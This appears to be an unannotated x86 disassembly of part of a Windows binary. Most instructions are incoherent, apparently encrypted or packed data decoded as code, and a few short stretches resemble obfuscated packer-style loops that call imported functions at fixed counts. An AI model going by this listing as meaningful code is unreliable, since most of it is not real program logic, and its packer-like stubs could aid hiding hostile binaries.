  40210e:	adc    al,0xbb
  402110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402111:	adc    bh,BYTE PTR [ecx-0x2d]
  402114:	cmp    eax,0x8871c22f
  402119:	sub    al,0xda
  40211b:	or     edi,0x7a
  40211e:	or     cl,BYTE PTR [esi+0x68f21299]
  402124:	push   eax
  402125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402127:	jle    0x40213f
  402129:	and    BYTE PTR [edi-0xf],ch
  40212c:	iret   
  40212d:	xchg   ebp,eax
  40212e:	call   DWORD PTR [esi+0x18]
  402131:	dec    eax
  402132:	test   DWORD PTR [edx+edx*2+0x38f86775],ecx
  402139:	cmc    
  40213a:	stos   BYTE PTR es:[edi],al
  40213b:	outs   dx,BYTE PTR ds:[esi]
  40213c:	cli    
  40213d:	mov    ebx,0x3f6f05d7
  402142:	and    DWORD PTR [ebx-0x6dbb4b5c],ecx
  402148:	ds dec esi
  40214a:	les    ebx,FWORD PTR [ebp-0x5f495c4]
  402150:	add    BYTE PTR [esi],ch
  402152:	push   ss
  402153:	gs ret 
  402155:	mov    esi,0x13c2ed63
  40215a:	daa    
  40215b:	neg    DWORD PTR [edx-0xc]
  40215e:	cmc    
  40215f:	loopne 0x402189
  402161:	push   es
  402162:	mov    esi,0xa0ace8fc
  402167:	test   dl,bh
  402169:	nop
  40216a:	adc    DWORD PTR [ebx+0xf],ecx
  40216d:	sbb    cl,BYTE PTR [ebp-0x39]
  402170:	js     0x4021be
  402172:	aad    0x36
  402174:	outs   dx,DWORD PTR ds:[esi]
  402175:	add    edi,DWORD PTR [eax+eax*1]
  402178:	xchg   ebp,eax
  402179:	ja     0x40215a
  40217b:	cwde   
  40217c:	push   ecx
  40217d:	mov    ?,WORD PTR [ebx-0x68]
  402180:	dec    ebx
  402181:	add    BYTE PTR [edi+eiz*8],ch
  402184:	inc    ebp
  402185:	push   es
  402186:	cmp    BYTE PTR [ebx+0x27],cl
  402189:	pushf  
  40218a:	pop    ds
  40218b:	adc    ebp,DWORD PTR [ecx+0x1e]
  40218e:	repz sbb al,0xfd
  402191:	stc    
  402192:	xchg   ecx,eax
  402193:	or     al,0x66
  402195:	xor    edi,DWORD PTR [esp+ecx*1-0x4]
  402199:	or     al,0x9c
  40219b:	rol    BYTE PTR [edx+0x3a],cl
  40219e:	(bad)  
  40219f:	popf   
  4021a0:	(bad)  
  4021a1:	and    esi,DWORD PTR [ebx-0x29eb0576]
  4021a7:	les    esp,FWORD PTR [edi+0x23]
  4021aa:	jno    0x402167
  4021ac:	stos   BYTE PTR es:[edi],al
  4021ad:	ficom  WORD PTR [ecx-0x43]
  4021b0:	nop
  4021b1:	lahf   
  4021b2:	enter  0xa397,0xad
  4021b6:	adc    BYTE PTR ds:0x8e04f0d0,ch
  4021bc:	ret    0x9982
  4021bf:	add    eax,0xf6eac0f2
  4021c4:	sbb    esp,edx
  4021c6:	dec    ebx
  4021c7:	push   0xffffffdd
  4021c9:	mov    eax,edx
  4021cb:	push   ebx
  4021cc:	cmp    esi,ebp
  4021ce:	add    ecx,edx
  4021d0:	or     DWORD PTR [edx],eax
  4021d2:	pop    eax
  4021d3:	neg    BYTE PTR [edx]
  4021d5:	mov    ch,0xb7
  4021d7:	outs   dx,BYTE PTR ds:[esi]
  4021d8:	pop    ds
  4021d9:	cmp    eax,0xd70ce25a
  4021de:	push   cs
  4021df:	(bad)  
  4021e0:	mov    dl,0x3a
  4021e2:	outs   dx,BYTE PTR ds:[esi]
  4021e3:	and    BYTE PTR [eax+0xd8fd19f],0x20
  4021ea:	lods   al,BYTE PTR ds:[esi]
  4021eb:	sahf   
  4021ec:	repnz mov ebp,0xca7aaee8
  4021f2:	icebp  
  4021f3:	in     al,0xfe
  4021f5:	lods   al,BYTE PTR ds:[esi]
  4021f6:	mov    al,0x3e
  4021f8:	push   edx
  4021f9:	(bad)  
  4021fa:	push   ds
  4021fb:	xchg   esi,eax
  4021fc:	adc    al,0xc6
  4021fe:	or     BYTE PTR [ecx-0x4d],cl
  402201:	ror    DWORD PTR [ecx+eiz*8-0x34],0xc6
  402206:	xor    DWORD PTR [edi-0x5db34bdc],edi
  40220c:	dec    esi
  40220d:	or     dh,bl
  40220f:	scas   eax,DWORD PTR es:[edi]
  402210:	xchg   ecx,eax
  402211:	cmc    
  402212:	test   BYTE PTR [edi+edx*4-0x7d],dh
  402216:	fs dec esp
  402218:	mov    bh,0x5
  40221a:	jne    0x4021ef
  40221c:	pusha  
  40221d:	pop    edx
  40221e:	xchg   esp,eax
  40221f:	jmp    0x2b2898ff
  402224:	adc    edi,DWORD PTR [edx+ebp*1]
  402227:	aas    
  402228:	xor    eax,0x288e615f
  40222d:	push   0x13ecb1f8
  402232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402233:	push   ss
  402234:	int    0xb4
  402236:	mov    cl,0x25
  402238:	stc    
  402239:	and    edi,edx
  40223b:	fsubr  st(0),st
  40223d:	fwait
  40223e:	jmp    0x3cbe5d1d
  402243:	pop    esp
  402244:	adc    BYTE PTR [ecx],dl
  402246:	pusha  
  402247:	dec    eax
  402248:	dec    edi
  402249:	scas   al,BYTE PTR es:[edi]
  40224a:	ins    BYTE PTR es:[edi],dx
  40224b:	pop    es
  40224c:	loop   0x402280
  40224e:	es popf 
  402250:	mov    eax,0x3d7ada23
  402255:	clc    
  402256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402257:	inc    ecx
  402258:	mov    ds:0x8af1f6b7,al
  40225d:	mov    edx,0x154c4442
  402262:	add    ebp,DWORD PTR [esi-0x53a007de]
  402268:	mov    edi,0x48c5b23a
  40226d:	je     0x40229d
  40226f:	iret   
  402270:	push   edi
  402271:	pop    esp
  402272:	mov    ecx,0xc278c7a4
  402277:	std    
  402278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402279:	fmulp  st(7),st
  40227b:	dec    eax
  40227c:	push   edx
  40227d:	int3   
  40227e:	push   ecx
  40227f:	adc    DWORD PTR [eax-0x59],ebx
  402282:	js     0x40223a
  402284:	dec    esp
  402285:	jl     0x4022b6
  402287:	(bad)  
  402288:	pop    edi
  402289:	or     edi,edi
  40228b:	imul   cl
  40228d:	and    al,0x56
  40228f:	mov    esp,0x6dafdf5b
  402294:	dec    esi
  402295:	push   esp
  402296:	test   al,0x26
  402298:	jmp    0x6cdf040a
  40229d:	aas    
  40229e:	push   esi
  40229f:	retf   0x6bd3
  4022a2:	in     eax,0x49
  4022a4:	shl    ebx,cl
  4022a6:	repnz arpl WORD PTR ds:0x5c11f6c0,bp
  4022ad:	repz mov eax,ds:0x30979148
  4022b3:	jb     0x402326
  4022b5:	mov    BYTE PTR [ebx],dl
  4022b7:	dec    ebx
  4022b8:	pslld  mm1,QWORD PTR ds:0x7fda8482
  4022bf:	jb     0x4022e2
  4022c1:	add    BYTE PTR [ebp+0x4d],al
  4022c4:	cld    
  4022c5:	xor    edx,DWORD PTR [ebp-0x26]
  4022c8:	stos   BYTE PTR es:[edi],al
  4022c9:	add    eax,0x2581517f
  4022ce:	outs   dx,DWORD PTR ds:[esi]
  4022cf:	in     eax,dx
  4022d0:	inc    edx
  4022d1:	add    BYTE PTR [eax],al
  4022d3:	add    BYTE PTR [eax],al
  4022d5:	add    BYTE PTR [ebx+0x42ed6f15],cl
  4022db:	add    BYTE PTR [edx-0x77],al
  4022de:	adc    eax,0x42ed6f
  4022e3:	cmp    DWORD PTR ds:0x42ed6f,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e93f
  4022fe:	cmp    DWORD PTR ds:0x42ed6f,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x4303c1,0x1f
  402315:	cmp    DWORD PTR ds:0x4303c1,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x4303c1,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e92f
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x4303c1
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x4303c1,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	mov    ebp,0xdb0409a5
  402366:	add    edi,DWORD PTR [esi+0x7e]
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x4022fc
  40236e:	fwait
  40236f:	repnz repnz sbb esi,ebx
  402373:	sbb    eax,0x40d749cd
  402378:	retf   
  402379:	fisub  DWORD PTR [ebx+esi*1]
  40237c:	ja     0x402338
  40237e:	cmc    
  40237f:	inc    esi
  402380:	aaa    
  402381:	outs   dx,DWORD PTR ds:[esi]
  402382:	outs   dx,BYTE PTR ds:[esi]
  402383:	mov    ds:0xd6f050e6,eax
  402388:	cmp    esp,DWORD PTR [eax]
  40238a:	push   ecx
  40238b:	ds aam 0x59
  40238e:	or     BYTE PTR [edx+0x4c],0x3f
  402392:	pop    ebx
  402393:	outs   dx,BYTE PTR ds:[esi]
  402394:	pop    edi
  402395:	je     0x402350
  402397:	mov    DWORD PTR [esi+0x536f1bb],esp
  40239d:	rol    BYTE PTR [edi],0xf4
  4023a0:	outs   dx,DWORD PTR ds:[esi]
  4023a1:	daa    
  4023a2:	shr    ah,0x6e
  4023a5:	sub    dh,0xcc
  4023a8:	inc    esp
  4023a9:	adc    al,0x60
  4023ab:	bound  esp,QWORD PTR [ebp-0x15bb3deb]
  4023b1:	xchg   ebp,esp
  4023b3:	mov    eax,ds:0xf46a32ae
  4023b8:	pop    edx
  4023b9:	and    dh,0x80
  4023bc:	inc    ebp
  4023bd:	inc    esi
  4023be:	mov    esp,0x90fd37b7
  4023c3:	and    BYTE PTR [edi-0x73bbb38c],0x5
  4023ca:	pop    ecx
  4023cb:	les    edx,FWORD PTR [edx]
  4023cd:	or     bh,BYTE PTR [edx]
  4023cf:	in     al,0xcb
  4023d1:	sar    BYTE PTR [eax+0x50fc83c7],0xd1
  4023d8:	imul   edi,DWORD PTR [esi],0x36c4d2b3
  4023de:	xor    eax,0x43de14c3
  4023e3:	adc    DWORD PTR [ecx-0x14],ebx
  4023e6:	xchg   DWORD PTR [esi],esp
  4023e8:	(bad)  
  4023e9:	mov    edi,0xd3376b30
  4023ee:	(bad)  
  4023ef:	scas   eax,DWORD PTR es:[edi]
  4023f0:	(bad)  
  4023f1:	mov    ch,0x91
  4023f3:	jmp    0x10b0:0x37a36064
  4023fa:	mov    ebx,0x9c509bb2
  4023ff:	mov    ebx,0x3b5d5893
  402404:	mov    dl,0xce
  402406:	ror    BYTE PTR [edi],cl
  402408:	out    0x24,eax
  40240a:	pop    ebp
  40240b:	popa   
  40240c:	xchg   ebp,eax
  40240d:	(bad)  
  40240e:	sbb    eax,DWORD PTR [ebp+0x72]
  402411:	or     BYTE PTR [edx],bl
  402413:	ins    BYTE PTR es:[edi],dx
  402414:	jle    0x40243f
  402416:	mov    ebx,0xc4e41ec7
  40241b:	pop    edi
  40241c:	fnstenv [eax]
  40241e:	cmp    ebp,edx
  402420:	xchg   edx,eax
  402421:	xor    eax,0x5e443c95
  402426:	jg     0x402469
  402428:	jl     0x402410
  40242a:	sub    edx,DWORD PTR [edx+0xf]
  40242d:	fsub   DWORD PTR gs:[esi+ecx*2+0x7c06f3f]
  402435:	xchg   DWORD PTR [eax+0x65],edx
  402438:	jge    0x4024a9
  40243a:	fbstp  TBYTE PTR [esi-0x676e2df7]
  402440:	add    BYTE PTR [ecx+ebp*2-0x76],cl
  402444:	inc    edi
  402445:	mov    edi,DWORD PTR [edx-0xd]
  402448:	xchg   ebx,eax
  402449:	jns    0x40243f
  40244b:	lea    esp,[edi+0x1331b7f0]
  402451:	mov    WORD PTR [eax],fs
  402453:	cld    
  402454:	or     eax,DWORD PTR [ebp+ebp*1-0x39]
  402458:	and    eax,esp
  40245a:	jecxz  0x4024cb
  40245c:	mov    al,0x34
  40245e:	scas   al,BYTE PTR es:[edi]
  40245f:	mov    ebx,0xa2e43e0c
  402464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402465:	lods   eax,DWORD PTR ds:[esi]
  402466:	cli    
  402467:	in     al,dx
  402468:	jo     0x40242d
  40246a:	scas   al,BYTE PTR es:[edi]
  40246b:	add    BYTE PTR [edi-0x72d0d983],al
  402471:	xor    cl,BYTE PTR [edx]
  402473:	mov    cl,0x75
  402475:	aaa    
  402476:	test   DWORD PTR [esi+0x595016a3],ecx
  40247c:	mov    dl,0x3f
  40247e:	mov    bh,0xa8
  402480:	xchg   BYTE PTR [ecx+0x39],dh
  402483:	push   cs
  402484:	jp     0x4024ff
  402486:	shr    DWORD PTR [bx+di],1
  402489:	sub    eax,0x627fddb1
  40248e:	dec    ecx
  40248f:	add    eax,0xec568358
  402494:	and    al,0x9f
  402496:	mov    eax,0x2da3bbec
  40249b:	inc    eax
  40249c:	xchg   ecx,eax
  40249d:	test   al,0xd2
  40249f:	adc    BYTE PTR [edx-0x5],ah
  4024a2:	mov    bh,0xd
  4024a4:	sub    bl,BYTE PTR [eax+0x72e3b901]
  4024aa:	xor    DWORD PTR [esi],eax
  4024ac:	jnp    0x402522
  4024ae:	stc    
  4024af:	push   0xffffffb3
  4024b1:	leave  
  4024b2:	pop    ss
  4024b3:	xlat   BYTE PTR ds:[ebx]
  4024b4:	in     al,dx
  4024b5:	or     dl,dl
  4024b7:	int    0x7d
  4024b9:	mov    ebx,0xf1610a3d
  4024be:	pop    es
  4024bf:	das    
  4024c0:	mov    DWORD PTR [ebx+0x25032713],ecx
  4024c6:	ins    BYTE PTR es:[edi],dx
  4024c7:	scas   al,BYTE PTR es:[edi]
  4024c8:	sar    DWORD PTR [ebx-0x7],cl
  4024cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024cc:	mov    ebp,DWORD PTR [esi+0x62]
  4024cf:	pop    ebx
  4024d0:	(bad)  
  4024d1:	aas    
  4024d2:	mov    ecx,0xf3a74e4e
  4024d7:	cmp    al,0x9d
  4024d9:	and    al,0xa4
  4024db:	push   edi
  4024dc:	loop   0x402536
  4024de:	rcl    DWORD PTR [ebx-0x7d],cl
  4024e1:	push   es
  4024e2:	add    eax,0x42f08718
  4024e7:	sti    
  4024e8:	(bad)  
  4024e9:	xchg   ebp,eax
  4024ea:	jge    0x4024b8
  4024ec:	sub    BYTE PTR [eax+0x4b],ah
  4024ef:	rol    DWORD PTR [esp+edx*1],cl
  4024f2:	xchg   edx,eax
  4024f3:	(bad)  
  4024f5:	enter  0x2639,0xa0
  4024f9:	add    ebx,DWORD PTR [edi]
  4024fb:	or     ebx,DWORD PTR [edx+0x9db7f8a]
  402501:	rol    BYTE PTR [edx],1
  402503:	mov    edx,0x45921463
  402508:	sti    
  402509:	sub    BYTE PTR [edx+0x31],bh
  40250c:	inc    edi
  40250d:	into   
  40250e:	repz inc edx
  402510:	sub    al,0xea
  402512:	cmp    eax,0xe2c483d9
  402517:	mov    edx,0x7146c08f
  40251c:	popa   
  40251d:	daa    
  40251e:	and    DWORD PTR [ebp+0x24],eax
  402521:	adc    eax,0x11692e22
  402526:	into   
  402527:	push   cs
  402528:	in     al,0x24
  40252a:	in     al,dx
  40252b:	jl     0x4024d4
  40252d:	es sub eax,0x55012b
  402533:	ins    DWORD PTR es:[edi],dx
  402534:	xchg   ebx,eax
  402535:	(bad)  
  402537:	jns    0x402560
  402539:	inc    ebx
  40253a:	push   ecx
  40253b:	stc    
  40253c:	fstp   QWORD PTR [eax]
  40253e:	push   edi
  40253f:	leave  
  402540:	sti    
  402541:	mov    bh,0x75
  402543:	adc    edx,DWORD PTR [esi]
  402545:	ror    BYTE PTR [esp+ebp*4+0x51],1
  402549:	and    DWORD PTR ds:0x42ed4b,0x3339
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42ed73
  40255f:	xor    edx,DWORD PTR ds:0x42ed4f
  402565:	mov    DWORD PTR ds:0x42ed73,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x4303e5,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x4303c5
  402592:	and    DWORD PTR ds:0x42ed57,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x43044f,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x43044f
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x43044f,esi
  4025b8:	cmp    DWORD PTR ds:0x43044f,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x43044f,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e7c6
  4025d7:	call   DWORD PTR ds:0x42e943
  4025dd:	cmp    DWORD PTR ds:0x43044f,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x43044f
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x43044f,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs (bad) 
  402613:	rcl    DWORD PTR [edi-0x48],cl
  402616:	add    DWORD PTR ds:[esi+0x7e],edi
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x4025f2
  40261f:	mov    bh,0x6f
  402621:	sbb    al,0x4
  402623:	cli    
  402624:	dec    ecx
  402625:	inc    ecx
  402626:	jg     0x402637
  402628:	fcomp  DWORD PTR [edi]
  40262a:	cs sbb cl,dh
  40262d:	div    ch
  40262f:	lock cmp ch,BYTE PTR [edx-0x7d]
  402633:	cdq    
  402634:	or     bl,BYTE PTR [esp+edi*1-0x43]
  402638:	fstp   st(7)
  40263a:	push   ecx
  40263b:	(bad)  
  40263c:	xchg   esp,eax
  40263d:	push   ds
  40263e:	inc    edi
  40263f:	cmp    al,0xf
  402641:	hlt    
  402642:	shl    DWORD PTR [esi],cl
  402644:	test   DWORD PTR [ebx],edi
  402646:	dec    ebp
  402647:	popa   
  402648:	(bad)  
  402649:	xor    al,0x74
  40264b:	jmp    0x2d4f2fe2
  402650:	lahf   
  402651:	int    0x8c
  402653:	lahf   
  402654:	adc    BYTE PTR [esi+0x384f628b],dh
  40265a:	mov    bl,BYTE PTR ds:0x910e5a22
  402660:	(bad)  
  402661:	mov    al,ds:0xf04fe4
  402666:	iret   
  402667:	ins    DWORD PTR es:[edi],dx
  402668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402669:	mov    ah,0x9f
  40266b:	mov    DWORD PTR [ecx-0x5c],eax
  40266e:	into   
  40266f:	addr16 test al,0xf5
  402672:	test   eax,0xa34c339e
  402677:	cmp    BYTE PTR [eax+edi*4+0xe23016a],al
  40267e:	(bad)  
  40267f:	push   ds
  402680:	ja     0x402698
  402682:	inc    esp
  402683:	lods   al,BYTE PTR ds:[esi]
  402684:	push   cs
  402685:	dec    DWORD PTR gs:[edi+0x4780c415]
  40268c:	out    dx,al
  40268d:	sub    ebx,esp
  40268f:	and    al,0x7d
  402691:	dec    esp
  402692:	ja     0x40268d
  402694:	dec    esp
  402695:	pop    edx
  402696:	mov    bh,0xe7
  402698:	mov    ah,0xc0
  40269a:	nop
  40269b:	ins    DWORD PTR es:[edi],dx
  40269c:	test   BYTE PTR [edx-0x20],dl
  40269f:	jmp    0x4026d4
  4026a1:	push   ebx
  4026a2:	sub    eax,0xfc4b5a83
  4026a7:	(bad)  
  4026a8:	out    dx,eax
  4026a9:	aaa    
  4026aa:	sub    al,0xfb
  4026ac:	mov    ch,0x6e
  4026ae:	and    eax,0x21e54ecc
  4026b3:	ja     0x402706
  4026b5:	cs pop ecx
  4026b7:	in     al,0xcd
  4026b9:	outs   dx,DWORD PTR ds:[esi]
  4026ba:	fiadd  DWORD PTR ds:0xc6f07cce
  4026c0:	sub    ah,BYTE PTR [eax]
  4026c2:	inc    edx
  4026c3:	test   BYTE PTR [edx+esi*4+0x34],bh
  4026c7:	sbb    bh,BYTE PTR [ecx-0x52c6a3b7]
  4026cd:	adc    al,0x65
  4026cf:	pop    ebp
  4026d0:	xchg   BYTE PTR [edx+0x21],dl
  4026d3:	rol    DWORD PTR [ebp+0x37],0x70
  4026d7:	add    BYTE PTR [ecx+0x57ba8105],0x62
  4026de:	popa   
  4026df:	pop    ds
  4026e0:	or     DWORD PTR ds:0xe60ea077,edi
  4026e6:	add    edx,DWORD PTR [esi+0x5e]
  4026e9:	es mov bl,0xf9
  4026ec:	jp     0x40274e
  4026ee:	add    ecx,DWORD PTR [esi+0x7d]
  4026f1:	or     eax,0x4a03b6cb
  4026f6:	adc    esi,DWORD PTR [edi+0x7d]
  4026f9:	loop   0x40270f
  4026fb:	(bad)  
  4026fc:	fcomp  QWORD PTR [ebx]
  4026fe:	jmp    0x22660e0b
  402703:	push   ds
  402704:	pop    esi
  402705:	gs inc edi
  402707:	push   esp
  402708:	mov    ebx,ss
  40270a:	or     edi,edx
  40270c:	push   cs
  40270d:	sbb    BYTE PTR [ecx],ch
  40270f:	lock (bad) 
  402711:	ins    DWORD PTR es:[edi],dx
  402712:	mul    DWORD PTR ds:0xa9a25911
  402718:	cmp    eax,0x1e2e5187
  40271d:	out    0xad,al
  40271f:	add    al,0xcd
  402721:	xor    bl,al
  402723:	hlt    
  402724:	jecxz  0x4026f6
  402726:	dec    ecx
  402727:	das    
  402728:	ds jb  0x402707
  40272b:	mov    ch,0xe3
  40272d:	(bad)  
  40272e:	xchg   edx,eax
  40272f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402730:	outs   dx,DWORD PTR ds:[esi]
  402731:	cmp    ebp,eax
  402733:	test   DWORD PTR [ebx-0x72fd8c4d],ebx
  402739:	stos   DWORD PTR es:[edi],eax
  40273a:	pop    eax
  40273b:	(bad)
  40273e:	xor    esp,DWORD PTR [ebx-0x56]
  402741:	mov    cl,0xa4
  402743:	xchg   esp,eax
  402744:	sub    ecx,eax
  402746:	rol    BYTE PTR [edi-0xd],0x98
  40274a:	mov    cl,0xcc
  40274c:	pop    edx
  40274d:	xchg   ebp,eax
  40274e:	pop    ebp
  40274f:	idiv   BYTE PTR [ebp+0x16]
  402752:	xchg   edx,eax
  402753:	mov    edx,0x51e79543
  402758:	scas   al,BYTE PTR es:[edi]
  402759:	lahf   
  40275a:	pop    ebp
  40275b:	or     ah,cl
  40275d:	sbb    cl,BYTE PTR [eax-0x44]
  402760:	nop
  402761:	xchg   edi,eax
  402762:	xor    al,0x41
  402764:	sti    
  402765:	pop    ds
  402766:	rcl    BYTE PTR [eax-0x47],1
  402769:	push   eax
  40276a:	mov    eax,0xe8c9e5ce
  40276f:	mov    bl,0x0
  402771:	mov    eax,?
  402773:	out    0xce,al
  402775:	cwde   
  402776:	jl     0x402732
  402778:	inc    eax
  402779:	jge    0x40274f
  40277b:	(bad)  
  40277c:	and    ebx,DWORD PTR [ecx]
  40277e:	rcr    BYTE PTR [ebx],0xd
  402781:	push   ebp
  402782:	or     eax,0x447f99d8
  402787:	popa   
  402788:	out    0x51,eax
  40278a:	xchg   ebp,eax
  40278b:	mov    dh,0x75
  40278d:	popa   
  40278e:	outs   dx,BYTE PTR ds:[esi]
  40278f:	mov    BYTE PTR [ecx-0x6003e047],dl
  402795:	cmp    edx,DWORD PTR [esi]
  402797:	dec    esi
  402798:	stc    
  402799:	repz and BYTE PTR [ecx+0x7076cbe5],dl
  4027a0:	dec    esi
  4027a1:	gs xchg esp,eax
  4027a3:	repnz xor BYTE PTR [edx-0x7],0x82
  4027a8:	fild   WORD PTR [esi-0x1f2fc0c8]
  4027ae:	cmp    eax,0x47221a29
  4027b3:	out    0x42,al
  4027b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027b6:	cmp    edi,DWORD PTR [ecx+0x4ad21a1b]
  4027bc:	add    ah,bl
  4027be:	or     eax,0x73ecd8aa
  4027c3:	fcmovbe st,st(6)
  4027c5:	dec    ecx
  4027c6:	sub    DWORD PTR [edi-0xf],ecx
  4027c9:	popf   
  4027ca:	bound  ebp,QWORD PTR [edx]
  4027cc:	cld    
  4027cd:	cs xor edi,esi
  4027d0:	jbe    0x402832
  4027d2:	fld    DWORD PTR [ebx]
  4027d4:	adc    DWORD PTR [edx-0x56],esi
  4027d7:	popf   
  4027d8:	hlt    
  4027d9:	mov    cl,BYTE PTR [ecx+0x7b]
  4027dc:	dec    ecx
  4027dd:	push   ss
  4027de:	cmp    cl,BYTE PTR [eax+0xd]
  4027e1:	popf   
  4027e2:	test   DWORD PTR ds:0x1b66260f,ecx
  4027e8:	and    eax,eax
  4027ea:	push   eax
  4027eb:	add    BYTE PTR [eax],dh
  4027ed:	push   ds
  4027ee:	cmc    
  4027ef:	fsub   st(0),st
  4027f1:	mul    DWORD PTR [ebp+eiz*8-0x75f113c8]
  4027f8:	pop    ds
  4027f9:	push   edi
  4027fa:	mov    edi,DWORD PTR [ebp+0x10]
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    DWORD PTR [esi],edi
  402828:	dec    esp
  402829:	es adc ax,0x7e0f
  40282e:	jle    0x402885
  402830:	jg     0x4028b0
  402832:	jle    0x4027da
  402834:	mov    bh,0x26
  402836:	mul    DWORD PTR [ebx-0x56]
  402839:	cmp    eax,0x4b15a36c
  40283e:	xchg   edx,eax
  40283f:	add    ebp,DWORD PTR [eax+0x6a3cb559]
  402845:	pop    esi
  402846:	in     al,dx
  402847:	int3   
  402848:	push   esp
  402849:	(bad)  
  40284a:	out    0xa4,eax
  40284c:	retf   
  40284d:	daa    
  40284e:	xor    eax,0xe3ed69c
  402853:	rcl    DWORD PTR [esi+0x1c],1
  402856:	or     bl,BYTE PTR [ebx+0x3a5f4160]
  40285c:	fdivr  QWORD PTR [eax-0x1c63ed76]
  402862:	lds    ecx,FWORD PTR [ecx-0x35]
  402865:	pop    ebx
  402866:	sub    ch,BYTE PTR ss:[edi+ebx*1]
  40286a:	out    0xb2,eax
  40286c:	pop    ebp
  40286d:	jnp    0x402837
  40286f:	setns  BYTE PTR [esi+0x6c02faa7]
  402876:	pop    ss
  402877:	pop    esp
  402878:	adc    ch,BYTE PTR [ebx]
  40287a:	sub    DWORD PTR [ebp-0x79cf0ee7],ecx
  402880:	dec    ecx
  402881:	mov    dl,0x9c
  402883:	xchg   edi,eax
  402884:	inc    ecx
  402885:	dec    esi
  402886:	shr    DWORD PTR [edi],cl
  402888:	sbb    ebp,DWORD PTR [ebx+ebp*8]
  40288b:	xor    al,0x2e
  40288d:	call   0x48f4:0x674082cc
  402894:	dec    eax
  402895:	stc    
  402896:	test   al,0x4b
  402898:	stos   BYTE PTR es:[edi],al
  402899:	pop    esp
  40289a:	push   edx
  40289b:	clc    
  40289c:	test   cl,0xdf
  40289f:	fmul   DWORD PTR [esi+0x4b]
  4028a2:	or     al,0x65
  4028a4:	daa    
  4028a5:	xor    eax,0x7fbceec6
  4028aa:	xchg   esp,eax
  4028ab:	int3   
  4028ac:	push   ecx
  4028ad:	scas   eax,DWORD PTR es:[edi]
  4028ae:	outs   dx,BYTE PTR ds:[esi]
  4028af:	jg     0x4028af
  4028b1:	ja     0x402905
  4028b3:	push   cs
  4028b4:	lods   al,BYTE PTR ds:[esi]
  4028b5:	sbb    esp,DWORD PTR [eax+ebx*2]
  4028b8:	scas   eax,DWORD PTR es:[edi]
  4028b9:	adc    eax,0x16222afd
  4028be:	out    dx,al
  4028bf:	jge    0x40289e
  4028c1:	and    al,0x55
  4028c3:	popf   
  4028c4:	shr    dx,1
  4028c7:	jmp    0x40284e
  4028c9:	sub    DWORD PTR [edi+0x47c5f64e],ebp
  4028cf:	jno    0x40287b
  4028d1:	fadd   st,st(3)
  4028d3:	outs   dx,BYTE PTR ds:[esi]
  4028d4:	pushf  
  4028d5:	and    cl,BYTE PTR ds:0x89cb8e47
  4028db:	xchg   esp,eax
  4028dc:	jg     0x402904
  4028de:	sbb    BYTE PTR [ecx+esi*8-0x18],bh
  4028e2:	xor    al,cl
  4028e4:	pop    eax
  4028e5:	dec    eax
  4028e6:	mov    edx,0x5fb4e7b3
  4028eb:	or     eax,0xa97add5a
  4028f0:	dec    esi
  4028f1:	sahf   
  4028f2:	data16 icebp 
  4028f4:	dec    edx
  4028f5:	cmp    ah,BYTE PTR [eax-0x6a]
  4028f8:	or     DWORD PTR ds:0xa62166d5,edx
  4028fe:	xchg   ebx,eax
